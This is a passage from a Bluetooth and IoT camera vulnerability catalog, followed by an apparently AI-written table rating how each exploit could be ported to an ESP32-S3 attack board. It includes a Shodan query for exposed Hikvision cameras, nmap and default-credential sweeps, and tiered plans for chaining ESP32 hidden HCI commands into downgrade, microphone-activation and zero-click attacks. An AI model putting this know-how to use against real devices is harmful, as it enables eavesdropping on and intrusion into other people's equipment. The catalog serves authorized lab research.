- 🔗 [seemoo-lab/frankenstein](https://github.com/seemoo-lab/frankenstein) — BT firmware emulation framework (companion to InternalBlue; used for fuzzing)

**Lab Status:** ⬜ Not yet tested  
**Notes:** The architectural flaws (CVE-2020-10368/10367) cannot be fixed by firmware — hardware revision required. Cypress implemented a monitor feature for protocol-level DoS. The Spectra attack chain requires an initial BT code execution (e.g., via BleedingTooth, BrakTooth, or BlueBorne) as a prerequisite. Extremely relevant for research into Raspberry Pi or any Broadcom/Cypress combo chip device.

---

### 27 — ESP32 Hidden HCI Commands
**CVE:** CVE-2025-27840  
**Type:** Undocumented Vendor-Specific HCI Commands — Memory Access / Spoofing  
**Vector:** Local HCI interface (USB/UART to ESP32 Bluetooth controller)  
**Severity:** Medium (CVSS 6.8) — **Elevated relevance for ESP32-S3 labs**  
**Discovered by:** Miguel Tarascó Acuña & Antonio Vázquez Blanco (Tarlogic Security)  
**Disclosed:** RootedCON March 2025  

**Description:**  
Tarlogic discovered **29 undocumented vendor-specific HCI commands** in the ESP32 Bluetooth controller firmware, operating in the standard vendor-specific OGF 0x3F space. These commands expose privileged hardware operations not documented in any public ESP32 datasheet or SDK:

- **0xFC01** — Read memory (arbitrary controller RAM)
- **0xFC02** — Write memory (arbitrary controller RAM)
- **0xFC32** — Set MAC address (spoof BT address)
- **0xFC0E** — Send raw LMP packet (inject Classic BT packets)
- **0xFC43** — Send raw LLCP packet (inject BLE link-layer control packets)

**Security implications:**
- Affects all ESP32 chips (including ESP32-S3) — confirmed present in firmware as of March 2025
- Exploitation requires either: (a) physical access to USB/UART, or (b) a prior software compromise with HCI socket access
- Memory write (0xFC02) can modify Bluetooth stack state, keys, or behavior at controller level
- MAC spoofing (0xFC32) enables impersonation of any previously seen device
- Raw LMP/LLCP injection enables replay attacks and protocol-level manipulation without going through the host stack

**⚠️ Important nuance:** The community debate is ongoing. The commands reside in a standard vendor-specific opcode range per the BT spec. Exploitation currently requires privileged local access — this is NOT a remote over-the-air exploit. However for a controlled lab environment with physical ESP32-S3 access, these commands are a direct attack surface.

**GitHub Repos to Clone:**
- 🔗 [em0gi/CVE-2025-27840](https://github.com/em0gi/CVE-2025-27840) — Python PoC (expanded version of RootedCON demo); enumerates all 29 hidden commands via HCI
- 🔗 [TarlogicSecurity/Talks](https://github.com/TarlogicSecurity/Talks/blob/main/2025_RootedCon_BluetoothTools.pdf) — Original Tarlogic RootedCON slides with full technical details

**Lab Status:** ⬜ Not yet tested  
**Notes:** Directly relevant to your ESP32-S3 setup. The PoC (`Enumerate.py`) sends each `0xFCxx` command over the HCI socket and records responses. To use: connect ESP32-S3 in HCI mode via USB, run the Python script. Command 0xFC32 (MAC spoof) is particularly useful for Bluetooth impersonation research. Espressif has acknowledged the issue and plans to remove the commands in a future firmware release.

---

## 📹 CHEAP IOT CAMERA EXPLOITS

---

### 11 — Default & Hardcoded Credentials
**CVE:** N/A (Systemic Issue)  
**Type:** Authentication Bypass via Default Credentials  
**Vector:** Web UI (HTTP), Telnet (23), SSH (22), RTSP (554)  
**Severity:** Critical  

**Description:**  
The overwhelming majority of white-label IoT cameras ship with `admin:admin`, `admin:12345`, blank passwords, or hidden hardcoded root accounts. Many also leave Telnet/SSH wide open on the local network for debugging purposes.

**Attack Steps:**
1. Enumerate LAN with `nmap -sV -p 23,22,80,554,8080`
2. Try default credentials against web UI, Telnet, and SSH
3. Use IoT botnet wordlists (Mirai, Mozi) — these are optimized for embedded devices
4. Never stop at the web interface — sweep **all** ports

**GitHub Repos Cloned:** ❌ None (technique-based)  
**Lab Status:** ⬜ Not yet tested  
**Notes:** `SecLists/Passwords/Default-Credentials/` is a solid starting wordlist.

---

### 12 — Command Injection — Zavio
**CVE:** CVE-2023-4249  
**Type:** Pre-Auth / Post-Auth Command Injection & Memory Corruption  
**Vector:** HTTP Management Interface  
**Severity:** Critical  
**Vendor Status:** Defunct — no patch will ever be released  

**Description:**  
BugProve discovered 34+ vulnerabilities in Zavio IP cameras running firmware M2.1.6.05, including 7 pre-authentication RCE exploits and multiple command injection flaws. The cameras execute unsanitized user input directly in shell commands through the management web interface.

**GitHub Repos Cloned:** ❌ No public GitHub PoC (BugProve shared PoCs privately with CISA)  
**Lab Status:** ⬜ Not yet tested  
**Notes:** Since Zavio is defunct, these are permanently unpatched. The disclosure advisory at `bugprove.com` contains technical details.

---

### 13 — Command Injection — PTZOptics
**CVE:** CVE-2024-8957 (+ CVE-2024-8956 auth bypass)  
**Type:** OS Command Injection — Chained with Auth Bypass  
**Vector:** HTTP Management Interface (`ntp_addr` parameter)  
**Severity:** Critical  
**In the Wild:** ✅ Actively exploited — on CISA KEV Catalog  

**Description:**  
Insufficient validation of the `ntp_addr` configuration parameter in PTZOptics PT30X-SDI/NDI cameras (firmware < 6.3.40) allows OS command injection. When chained with CVE-2024-8956 (authentication bypass), an unauthenticated remote attacker achieves full command execution. Actively exploited in the wild by threat actors.

**GitHub Repos Cloned:** ❌ No confirmed public GitHub PoC found  
**Lab Status:** ⬜ Not yet tested  
**Notes:** Patch available — firmware 6.3.40. "Gayfemboy" botnet variant has been linked to active exploitation.

---

### 14 — Yi IOT Camera RCE
**CVE:** N/A (2025 disclosure)  
**Type:** Directory Traversal → Root TCP Shell  
**Vector:** Proprietary daemon on TCP port 6789  
**Severity:** Critical  

**Description:**  
Directory traversal in the Yi IOT camera's background `daemon` process (listening on port 6789) allows triggering the execution of `/usr/bin/cmd`. This immediately opens a **root TCP shell on port 999** — a fully interactive, unauthenticated root shell with no further exploitation required.

**GitHub Repos Cloned:**
- 📁 `github-repos/YiIOT-Camera-RCE/RCE-YiIOT/` — [Yasha-ops/RCE-YiIOT](https://github.com/Yasha-ops/RCE-YiIOT)

**Lab Status:** ⬜ Not yet tested  
**Notes:** Port 999 and 6789 should be in your port sweeps for Yi-branded and OEM resellers.

---

### 15 — Hikvision Auth Bypass
**CVE:** CVE-2017-7921  
**Type:** Improper Authentication — Config File Exfiltration  
**Vector:** HTTP  
**Severity:** Critical  
**In the Wild:** ✅ Actively exploited — 2017 CVE still widespread in 2025+  

**Description:**  
The absolute classic IoT backdoor that will not die. Hikvision's web interface allows an attacker to completely bypass authentication and download the device's full configuration file. This file contains **plaintext admin credentials**, network settings, and potentially RTSP stream credentials. Still found on millions of cameras globally.

**GitHub Repos Cloned:**
- 📁 `github-repos/Hikvision-CVE-2017-7921/CVE-2017-7921-EXPLOIT/` — [K3ysTr0K3R/CVE-2017-7921-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2017-7921-EXPLOIT)

**Lab Status:** ⬜ Not yet tested  
**Notes:** Shodan query: `"Hikvision" port:80,443,554`. Affects a massive number of cameras.

---

### 16 — Victure PC420 Hardcoded Root Password
**CVE:** CVE-2023-41610  
**Type:** Hardcoded Credentials  
**Vector:** Local / LAN access  
**Severity:** High  

**Description:**  
The Victure PC420 (firmware v1.1.39) ships with a hardcoded root password stored in plaintext. Related CVEs for this device include CVE-2023-41611 (weak encryption) and CVE-2023-41612 (additional hardcoded creds). These cameras are a textbook example of the "Operation Big Brother" class of issues — cheap white-label devices with zero security posture.

**GitHub Repos Cloned:** ❌ No public PoC found  
**Lab Status:** ⬜ Not yet tested  
**Notes:** Extract creds by dumping firmware via UART/JTAG or using binwalk on firmware images.

---

## 🌐 IOT INFRASTRUCTURE THREATS

---

### 17 — Ni8mare — n8n RCE
**CVE:** CVE-2026-21858  
**Type:** Unauthenticated Remote Code Execution  
**Vector:** HTTP webhook / file handler (Content-Type confusion)  
**Severity:** Critical (**CVSS 10.0** — Maximum)  
**Affects:** n8n < v1.121.0  
**Discovered by:** Cyera Research Labs  
**Patched:** n8n v1.121.0 (November 18, 2025)  

**Description:**  
A Content-Type confusion flaw in how n8n processes webhook requests. Webhook handlers access `req.body.files` without validating the request's content type — meaning an `application/json` request can supply a crafted `files` object that n8n treats as a legitimate uploaded file. Full exploit chain:

1. **Arbitrary file read** via path traversal in the file handler
2. **Admin token forgery** by reading internal database/session files
3. **Sandbox bypass** 
4. **System command execution** on the host

Affects all n8n instances exposing webhook endpoints to the internet (common in home automation, IoT pipelines, etc.).

**GitHub Repos Cloned:**
- 📁 `github-repos/Ni8mare-CVE-2026-21858/CVE-2026-21858/` — [Chocapikk/CVE-2026-21858](https://github.com/Chocapikk/CVE-2026-21858) *(includes `exploit.py`)*

**Lab Status:** ⬜ Not yet tested  
**Notes:** Not a "pwn any n8n" exploit — requires specific workflow configurations. Still, extremely dangerous for exposed self-hosted instances.

---

### 18 — Mozi DHT P2P Botnet Architecture
**CVE:** N/A (Structural Architecture)  
**Type:** Resilient P2P Botnet — IoT Mass Exploitation  
**Vector:** Known RCE CVEs in routers / DVRs / cameras + DHT P2P C2  
**Severity:** ⚠️ Systemic Threat  

**Description:**  
Mozi doesn't use a central Command and Control server — it uses a **Distributed Hash Table (DHT)** protocol (identical to BitTorrent's). Every infected device acts as a peer. This makes takedowns nearly impossible without seizing all nodes simultaneously.

**How it works:**
1. Scans the internet for vulnerable routers, DVRs, cameras
2. Exploits known RCE CVEs (Netgear, D-Link, Huawei, etc.) 
3. Immediately blocks ports 23 (Telnet), 22 (SSH), 80 (HTTP) after infection — **to prevent other botnets from stealing the node**
4. New node joins the DHT swarm and awaits P2P commands

**Bottom line:** If you put a vulnerable white-label camera or router on the open internet, Mozi (or its descendants) **will find it within hours**, exploit it, and lock everyone else out.

**GitHub Repos Cloned:** ❌ N/A (Analysis/Architecture study)  
**Lab Status:** ⬜ Observed behavior only — not replicated in lab  
**Notes:** Mozi source code was leaked and is available for study. Suricata/Snort rules exist for detection.

---

## 🛠️ BLUETOOTH SECURITY TOOLS & RESEARCH FRAMEWORKS

> These are not standalone CVE exploits but **essential attack/research tools** for Bluetooth security work. Many of the CVE PoCs above depend on these. All are highly relevant to ESP32-S3 research.

---

### TOOL-A — InternalBlue
**Type:** Bluetooth Firmware Research & Exploitation Framework  
**Target Chips:** Broadcom BCM / Cypress CYW combo chips (iPhones, MacBooks, Samsung Galaxy, Raspberry Pi)  
**Key Use Cases:** Firmware patching, arbitrary LMP injection, memory read/write, KNOB/BIAS PoC platform, Spectra research, fuzzing  

**Description:**  
InternalBlue is the core research framework from the SEEMOO Lab at TU Darmstadt. It connects to the Bluetooth firmware of Broadcom/Cypress chips via ADB (Android), HCI socket (Linux), or USB serial and provides direct access to:
- Send/receive arbitrary HCI and LMP packets
- Read and write controller RAM
- Patch firmware functions on-the-fly
- Monitor all BT traffic without packet loss (including encrypted)

Used as the foundation for KNOB, BIAS, Spectra, and BleedingTooth research. Also used by the SweynTooth researchers for LCP packet crafting.

**GitHub Repos:**
- 🔗 [seemoo-lab/internalblue](https://github.com/seemoo-lab/internalblue) — Primary framework
- 🔗 [seemoo-lab/frankenstein](https://github.com/seemoo-lab/frankenstein) — Companion firmware emulator for fuzz testing

**Notes:** Requires a Nexus 5, Pixel series, or Raspberry Pi 3 (all use Broadcom chips). RAM read/write commands were disabled by Broadcom in post-Spectra firmware versions — check chip firmware date.

---

### TOOL-B — Btlejack
**CVE Linked:** CVE-2018-7252 ("Btlejacking")  
**Type:** BLE Sniff / Jam / Connection Hijack  
**Hardware:** BBC Micro:Bit (×1–3) or Adafruit Bluefruit LE Sniffer or nRF51822 eval kit  

**Description:**  
Btlejack is Damien Cauquil's (DEF CON 26) BLE Swiss Army knife. It can sniff both new and existing BLE connections, jam BLE traffic, and take over (hijack) an active BLE connection — all with ~$15 of hardware. CVE-2018-7252 (btlejacking) enables unauthorized access to already-connected BLE devices, bypasses authentication, and preserves the device's internal state post-hijack.

**GitHub Repos:**
- 🔗 [virtualabs/btlejack](https://github.com/virtualabs/btlejack) — Full tool + Micro:Bit firmware; supports BLE 4.x and 5.x (1Mbps uncoded PHY)

**Notes:** Running 3 Micro:Bits simultaneously covers all advertising channels and dramatically improves connection capture reliability. Highly relevant for ESP32-S3 as a target — test BLE connection security.

---

### TOOL-C — BtleJuice
**Type:** BLE Man-in-the-Middle Framework  
**Hardware:** Two BLE 4.0+ USB adapters (one central, one peripheral; CSR or similar)  

**Description:**  
BtleJuice by Damien Cauquil (DEF CON 24) provides a full BLE MITM framework with a web UI. It creates a fake BLE peripheral that mirrors the real device, intercepts all GATT operations between the phone and the target, and allows on-the-fly data modification, replay, and logging. Useful for: reverse engineering proprietary BLE protocols, attacking insecure IoT devices, testing BLE apps.

**GitHub Repos:**
- 🔗 [DigitalSecurity/btlejuice](https://github.com/DigitalSecurity/btlejuice) — Full framework (Node.js); requires two separate machines or VMs for dual BT adapter operation

**Notes:** BtleJuice is older but well-documented. Gattacker (see TOOL-D) is more commonly used now for MITM. BtleJuice provides a nicer web UI.

---

### TOOL-D — GATTacker
**Type:** BLE Man-in-the-Middle / GATT Proxy  
**Hardware:** Two CSR 8510-based USB BLE adapters  
**Presented:** Black Hat USA 2016 (Slawomir Jasek)  

**Description:**  
GATTacker is a Node.js BLE MITM tool. It scans for BLE devices, clones their GATT profile, and acts as a proxy — impersonating the device to the mobile app while relaying traffic to the real device. Features:
- Full GATT dump (services, characteristics, descriptors)
- Profile replay
- On-the-fly packet modification
- MAC address spoofing to impersonate target device to smartphone

Particularly effective against IoT devices that rely on BLE without application-level authentication (smart locks, wearables, medical devices).

**GitHub Repos:**
- 🔗 [securing/gattacker](https://github.com/securing/gattacker) — Install via `npm install gattacker`; requires noble + bleno

**Notes:** ESP32-Gattacker — a purpose-built ESP32 port of Gattacker firmware — was presented at CypherCon and democratizes BLE MITM research on a $5 ESP32 board. No public GitHub repo confirmed yet for the ESP32 port.

---

### TOOL-E — BlueToolkit
**Type:** Bluetooth Classic Vulnerability Testing Framework  
**Coverage:** 40+ documented BT attacks with integrated PoC scripts  

**Description:**  
BlueToolkit by sgxgsx is an extensible Bluetooth Classic security testing framework covering virtually the entire known attack surface. It includes a comprehensive "Awesome Bluetooth Security" vulnerability table mapping every known BT/BLE attack to its CVEs, PoCs, hardware requirements, and GitHub links. Attacks include: KNOB, BIAS, BlueBorne, BrakTooth, SweynTooth, BlueFrag, automotive vulnerabilities, mesh attacks, Tesla relay attacks, and dozens more.

**GitHub Repos:**
- 🔗 [sgxgsx/BlueToolkit](https://github.com/sgxgsx/BlueToolkit) — Framework + comprehensive vulnerability database; tested against 22 car models (Audi, BMW, Tesla, VW, Mercedes-Benz, etc.)

**Notes:** Invaluable as a cross-reference. The vulnerability table inside is one of the most comprehensive public BT security references available. Has been used to discover 60+ new automotive BT vulnerabilities.

---

### TOOL-F — Crackle
**Type:** BLE Legacy Pairing Encryption Cracker  
**CVE Linked:** N/A (spec-level weakness in BLE legacy pairing)  
**Presented:** USENIX WOOT 2013 (Mike Ryan)  

**Description:**  
Crackle exploits a fundamental weakness in BLE legacy pairing (Bluetooth 4.0–4.1): the Temporary Key (TK) used in the "Just Works" pairing method is always 000000 (six zeros), and in Passkey Entry mode, it's only 0–999999 (easily brute-forced). Crackle can recover the Long Term Key (LTK) from a passively captured pairing exchange and decrypt all subsequent encrypted BLE traffic offline.

- Affects: All BLE devices using legacy pairing (pre-Secure Connections / BLE 4.2)
- Works on pcap files from passive BLE sniffers (Ubertooth, Wireshark, nRF sniffer)
- Requires capturing the initial pairing exchange (connection + CONNECT_REQ + LL_ENC frames)

**GitHub Repos:**
- 🔗 [mikeryan/crackle](https://github.com/mikeryan/crackle) — Standalone tool; takes pcap as input, outputs decrypted traffic or recovered LTK

**Notes:** Less relevant against BLE 4.2+ Secure Connections (which uses ECDH). Still very relevant against older IoT devices and many industrial BLE peripherals that haven't been updated. Works well with Ubertooth captures.

---

## 📁 GITHUB REPOS DIRECTORY STRUCTURE

```
z:\AGENTIC NYKI\9Z\github-repos\
│
├── BlueDucky-CVE-2023-45866\
│   └── BlueDucky\                        ← hackwithakki/BlueDucky
│
├── WhisperPair-CVE-2025-36911\
│   └── wpair-app\                        ← zalexdev/wpair-app
│
├── BLUFFS-CVE-2023-24023\
│   └── bluffs\                           ← francozappa/bluffs
│
├── Airoha-RACE-CVE-2025-20700\
│   └── race-toolkit\                     ← auracast-research/race-toolkit
│
├── SweynTooth\
│   └── sweyntooth_bluetooth_low_energy_attacks\   ← Matheus-Garbelini
│
├── BrakTooth\
│   └── braktooth_esp32_bluetooth_classic_attacks\ ← Matheus-Garbelini
│
├── BlueSpy\
│   └── BlueSpy\                          ← TarlogicSecurity/BlueSpy
│
├── PerfektBlue-CVE-2024-45434\
│   └── PerfektBlue\                      ← Nour833/PerfektBlue
│
├── Ni8mare-CVE-2026-21858\
│   └── CVE-2026-21858\                   ← Chocapikk/CVE-2026-21858
│
├── YiIOT-Camera-RCE\
│   └── RCE-YiIOT\                        ← Yasha-ops/RCE-YiIOT
│
├── Hikvision-CVE-2017-7921\
│   └── CVE-2017-7921-EXPLOIT\            ← K3ysTr0K3R/CVE-2017-7921-EXPLOIT
│
│  ── NEW ENTRIES (to clone) ──
│
├── KNOB-CVE-2019-9506\
│   ├── knob\                             ← francozappa/knob
│   └── bluetooth-KNOB\                  ← u10427687/bluetooth-KNOB
│
├── BIAS-CVE-2020-10135\
│   └── bias\                            ← francozappa/bias
│
├── BlueFrag-CVE-2020-0022\
│   ├── Bluefrag_CVE-2020-0022\          ← k3vinlusec/Bluefrag_CVE-2020-0022
│   ├── CVE-2020-0022-polo\              ← Polo35/CVE-2020-0022
│   ├── CVE-2020-0022-themo\            ← themmokhtar/CVE-2020-0022
│   └── cve-2020-0022-leom\             ← leommxj/cve-2020-0022
│
├── BlueBorne-CVE-2017-0781\
│   ├── blueborne\                       ← ArmisSecurity/blueborne
│   ├── BlueBorne-PoC-0785\             ← Alfa100001/-CVE-2017-0785-BlueBorne-PoC
│   ├── CVE-2017-0781\                  ← ojasookert/CVE-2017-0781
│   └── Blue-Borne\                     ← CrackSoft900/Blue-Borne
│
├── BleedingTooth-CVE-2020-12351\
│   └── security-research\              ← google/security-research (pocs/linux/bleedingtooth)
│
├── ESP32-HCI-CVE-2025-27840\
│   ├── CVE-2025-27840\                 ← em0gi/CVE-2025-27840
│   └── Talks\                          ← TarlogicSecurity/Talks (RootedCON slides)
│
│  ── TOOLS (to clone) ──
│
├── tools\
│   ├── internalblue\                   ← seemoo-lab/internalblue
│   ├── frankenstein\                   ← seemoo-lab/frankenstein
│   ├── btlejack\                       ← virtualabs/btlejack
│   ├── btlejuice\                      ← DigitalSecurity/btlejuice
│   ├── gattacker\                      ← securing/gattacker
│   ├── BlueToolkit\                    ← sgxgsx/BlueToolkit
│   └── crackle\                        ← mikeryan/crackle
```

---

## 🔧 QUICK REFERENCE — ATTACK CATEGORIES

| Attack Class | Exploits |
|---|---|
| **Zero-Click / No Interaction** | Android Zero-Click (09), BlueDucky (01), WhisperPair (02), BlueFrag (21), BlueBorne (22), BleedingTooth (23) |
| **Adversary-in-the-Middle** | BLUFFS (03), KNOB (19), BIAS (20), Spectra (26) |
| **Device Impersonation / Auth Bypass** | BIAS (20), BLESA (25), BlueDucky (01) |
| **Unauth Memory / Protocol Access** | Airoha RACE (04), SweynTooth (05), BLEEDINGBIT (24), ESP32 HCI (27) |
| **Crash / DoS / Fuzzing** | BrakTooth (06), SweynTooth (05), Spectra (26) |
| **Encryption Downgrade** | KNOB (19), BLUFFS (03) |
| **Audio Surveillance** | BlueSpy (07), WhisperPair (02), Airoha RACE (04) |
| **Location Tracking** | WhisperPair (02), Blue's Clues (10) |
| **Automotive** | PerfektBlue (08) |
| **ESP32-S3 Specific** | ESP32 HCI (27), BrakTooth (06 — uses ESP32 as platform) |
| **BLE Reconnection / Session** | BLESA (25), Btlejack (TOOL-B), GATTacker (TOOL-D) |
| **WiFi/BT Coexistence** | Spectra (26) |
| **BLE Legacy Pairing Crack** | Crackle (TOOL-F) |
| **IoT Camera — RCE** | Yi IOT (14), Zavio (12), PTZOptics (13) |
| **IoT Camera — Auth Bypass** | Hikvision (15), Default Creds (11), Victure (16) |
| **IoT Infrastructure** | Ni8mare (17), Mozi (18) |

---

## 🔵 ESP32-S3 BLUETOOTH ATTACK SURFACE — QUICK REF

| Vector | Relevant Entries | Notes |
|---|---|---|
| **ESP32-S3 as Target** | CVE-2025-27840 (27) | 29 hidden HCI commands; MAC spoof, mem R/W, raw LMP/LLCP inject |
| **ESP32-S3 as Attack Platform** | BrakTooth (06) | Garbelini's framework uses ESP32 for LMP fuzzing |
| **BLE MITM via ESP32** | TOOL-D (GATTacker), TOOL-B (Btlejack) | ESP32-Gattacker port exists; Btlejack uses nRF hardware |
| **BLE Stack Bugs on ESP32** | SweynTooth (05) | InternalBlue was used to test some vectors |
| **Classic BT on ESP32-S3** | BlueDucky (01), BIAS (20), KNOB (19) | ESP32-S3 supports BR/EDR; test HID injection, key downgrade |
| **Firmware / Supply Chain** | CVE-2025-27840 (27) | OEM interception + 0xFC02 memory write = persistent implant risk |

---

*All research is conducted in a controlled lab environment for authorized security testing and educational purposes only.*



Evaluated ESP32-S3 exploit adaptability across Bluetooth attack vectors
Evaluated ESP32-S3 exploit adaptability across Bluetooth attack vectors
Good question — this is worth a really clean breakdown because the answer varies a lot depending on why something is or isn't portable. Let me work through every entry systematically.

The key limiting factors for ESP32-S3 are:

✅ Standard BLE (scan, advertise, GATT R/W, custom payloads) — fully supported
✅ Standard BR/EDR profiles (HID, A2DP, HFP, AVRCP, SDP) — fully supported
⚠️ Raw LMP injection — requires BrakTooth-style firmware patching OR CVE-2025-27840 0xFC0E hidden command
⚠️ Raw LLCP/L2CAP crafting — requires firmware patching OR CVE-2025-27840 0xFC43 hidden command
❌ Broadcom/Cypress chip internals — wrong architecture entirely
❌ Host-side kernel attacks — ESP32-S3 isn't the host; it's the radio
Full Compatibility Matrix
#	Exploit	Verdict	Effort	Reason
01	BlueDucky	✅ Yes	Low	ESP32-S3 supports BR/EDR HID profile natively. Can register as a HID peripheral and initiate unauthenticated Just Works pairing directly from ESP-IDF. No host needed.
02	WhisperPair	✅ Yes	Low–Med	ESP32-S3 BLE GATT is fully capable of scanning for Fast Pair UUIDs and sending unauthenticated pairing requests. Standard BLE GATT operations.
03	BLUFFS	⚠️ Possible	High	Requires MitM positioning + LMP key negotiation manipulation. Needs raw LMP injection — achievable via BrakTooth firmware mod or 0xFC0E (CVE-2025-27840). Significant custom firmware work required.
04	Airoha RACE	✅ Partially	Low–Med	BLE GATT portion: Yes — ESP32-S3 can connect unauthenticated to any GATT service and send arbitrary reads/writes. Classic BT RACE auth bypass: harder, needs raw LMP access.
05	SweynTooth	⚠️ Possible	Med–High	BLE malformed packet crafting. Some vectors (Zero LTK, deadlock) require low-level BLE LL packet manipulation. Achievable via esp_ble_gap raw advertising or 0xFC43 LLCP injection from CVE-2025-27840. Not turnkey.
06	BrakTooth	✅ Yes — Native	Done	This exploit was literally built on ESP32. Garbelini's repo targets ESP32 as the attack platform. S3 requires a compatible firmware build but is functionally equivalent. Already in your lab.
07	BlueSpy	✅ Yes	Low	ESP32-S3 supports A2DP and HFP profiles. Can initiate Just Works pairing and connect HFP to activate the microphone on a target speaker. Fully within standard ESP-IDF BT stack.
08	PerfektBlue	⚠️ Possible	High	Requires malformed AVRCP packet crafting (UAF trigger). ESP32-S3 supports AVRCP CT role. Custom malformed packet construction beyond what ESP-IDF exposes natively — would require patching the AVRCP layer in source. Doable but involved.
09	Android Zero-Click (CVE-2025-48539)	⚠️ Possible	High	Requires malformed L2CAP fragmented ACL packets. With 0xFC0E (raw LMP) or 0xFC43 (raw LLCP) from CVE-2025-27840, or BrakTooth-style firmware patching, raw L2CAP crafting is achievable. No public PoC to port yet.
10	Blue's Clues / MAC Tracking	✅ Yes	Very Low	ESP32-S3 active scanning (esp_bt_gap_start_discovery) retrieves BD_ADDR from non-discoverable devices via page scan. Straightforward.
19	KNOB	⚠️ Possible	High	Requires MitM + LMP LMP_encryption_key_size_req interception and modification. The same BrakTooth LMP injection path makes this theoretically achievable on ESP32-S3. Requires implementing the key entropy negotiation logic on top.
20	BIAS	⚠️ Possible	High	Requires manipulating the BR/EDR authentication sequence at LMP level — forcing legacy auth after SC negotiation. Same raw LMP injection prerequisite as KNOB. The BIAS PoC was built on InternalBlue (Broadcom), so the logic needs to be re-implemented for ESP32-S3's firmware.
21	BlueFrag	⚠️ Possible	High	Requires malformed fragmented L2CAP ACL packets targeting Android BT stack. Raw ACL packet injection via 0xFC0E / BrakTooth firmware path is the route. Would need the specific packet structure from the PoC re-implemented.
22	BlueBorne	⚠️ Partially	Med–High	CVE-2017-0785 (SDP info leak): Yes — ESP32-S3 can initiate SDP queries and send malformed SDP PDUs; this is standard BT. BNEP RCE (CVE-2017-0781/0782): Harder — requires crafting malformed BNEP frames; ESP32-S3 doesn't expose BNEP natively so this needs custom implementation. Older Android targets only.
23	BleedingTooth	⚠️ Possible	High	Requires raw L2CAP A2MP packet crafting targeting Linux BlueZ hosts. Same raw packet injection path as BlueFrag. The Linux target is well within range of an ESP32-S3 radio. Needs the PoC exploit chain re-implemented targeting the A2MP vulnerability.
24	BLEEDINGBIT	✅ Yes	Med	CVE-2018-16986 (BLE adv overflow): ESP32-S3 can send arbitrary BLE advertising beacons with custom payloads including the malformed length fields that trigger the TI chip overflow. BLE advertising is fully controllable. CVE-2018-7080 (OAD backdoor): Requires implementing the OAD BLE service client — feasible, it's a standard BLE GATT interaction.
25	BLESA	✅ Partially	Med	Impersonation/spoofing portion: Yes — ESP32-S3 can clone a BLE peripheral's advertising data and GATT profile and attempt to be faster than the real device on reconnection. Reliable jamming of the real peripheral requires additional hardware (nRF + Btlejack, or a second radio). Without jamming it's probabilistic.
26	Spectra	❌ No	N/A	Chip-specific attack. Spectra exploits the Broadcom/Cypress SECI coexistence bus between their specific WiFi and BT silicon. ESP32-S3 uses Espressif's own coexistence architecture — entirely different hardware. Cannot be ported. Interesting to study for analogous research on ESP32-S3's own coexistence mechanism though.
27	ESP32 Hidden HCI	✅ Yes — Native	Done	This IS the ESP32-S3. The PoC runs directly against your device's HCI interface. 0xFC32 (MAC spoof), 0xFC02 (mem write), 0xFC0E (raw LMP injection), 0xFC43 (raw LLCP injection) are all directly usable and massively expand what the other exploits above can do when combined.
Tool Portability
Tool	Verdict	Notes
InternalBlue	❌ No	Chip-specific to Broadcom/Cypress. Cannot run on or target ESP32-S3's chip. However it's the conceptual blueprint for what CVE-2025-27840 gives you natively.
Btlejack	⚠️ Concept only	Designed for nRF51/52 hardware. The BLE sniff/jam/hijack concepts could be re-implemented on ESP32-S3 but native passive sniffing (promiscuous mode) is limited without patching.
BtleJuice	⚠️ Partial	Runs on a host PC. Can use ESP32-S3 as the BLE radio backend via serial HCI, making it a compact portable MITM device.
GATTacker	✅ Yes	ESP32-Gattacker port exists. Two-radio GATT MITM on a single $5 board.
BlueToolkit	⚠️ Partial	Python framework runs on host, but can drive an ESP32-S3 as the BT radio backend for Classic BT attacks.
Crackle	❌ No	Offline pcap processing tool. Runs on a host. The ESP32-S3 could feed it captures but isn't the right platform to run Crackle itself.
The Big Picture
Roughly speaking you can divide everything into three tiers for your build:

Tier 1 — Works today, low effort (01, 02, 04 BLE half, 06, 07, 10, 24, 25 partial, 27): These use standard ESP-IDF BT/BLE APIs or leverage the already-discovered hidden HCI commands. This is your immediate attack surface.

Tier 2 — Works with firmware patching (03, 05, 08, 09, 19, 20, 21, 22 partial, 23, 25 reliable): CVE-2025-27840's 0xFC0E and 0xFC43 commands are the unlock key for most of this tier. They give you raw LMP and LLCP injection without needing to rebuild the entire firmware from scratch — which dramatically lowers the barrier for KNOB, BIAS, BlueFrag, BleedingTooth, etc.

Tier 3 — Not portable (26, InternalBlue, Crackle): Wrong chip architecture or host-only tools. Don't spend time here unless the research goal is finding Spectra-equivalent issues in Espressif's own coexistence design.

The most interesting insight for your lab: CVE-2025-27840 is effectively your InternalBlue. The 29 hidden commands give you the raw packet injection capabilities that InternalBlue provides on Broadcom hardware — and that capability is what unlocks Tier 2.

